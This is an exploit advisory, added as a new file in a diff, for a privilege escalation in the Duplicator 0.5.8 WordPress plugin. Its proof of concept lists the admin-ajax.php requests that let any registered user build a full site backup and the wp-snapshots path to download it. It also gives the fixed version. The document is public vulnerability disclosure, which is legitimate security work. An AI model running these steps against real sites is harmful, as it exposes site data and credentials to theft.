@@ -1,0 +1,39 @@
+# Exploit Title: Duplicator 0.5.8 Privilege Escalation
+# Date: 21-11-2014
+# Software Link: https://wordpress.org/plugins/duplicator/
+# Exploit Author: Kacper Szurek
+# Contact: http://twitter.com/KacperSzurek
+# Website: http://security.szurek.pl/
+# Category: webapps
+
+1. Description
+  
+Every registered user can create and download backup files.
+
+File: duplicator\duplicator.php
+add_action('wp_ajax_duplicator_package_scan',		'duplicator_package_scan');
+add_action('wp_ajax_duplicator_package_build',		'duplicator_package_build');
+add_action('wp_ajax_duplicator_package_delete',		'duplicator_package_delete');
+add_action('wp_ajax_duplicator_package_report',		'duplicator_package_report');
+
+http://security.szurek.pl/duplicator-058-privilege-escalation.html
+
+2. Proof of Concept
+
+Login as regular user (created using wp-login.php?action=register) then start scan:
+
+http://wordpress-url/wp-admin/admin-ajax.php?action=duplicator_package_scan
+
+After that you can build backup:
+
+http://wordpress-url/wp-admin/admin-ajax.php?action=duplicator_package_build
+
+This function will return json with backup name inside File key.
+
+You can download backup using:
+
+http://wordpress-url/wp-snapshots/%file_name_from_json%
+
+3. Solution:
+  
+Update to version 0.5.10
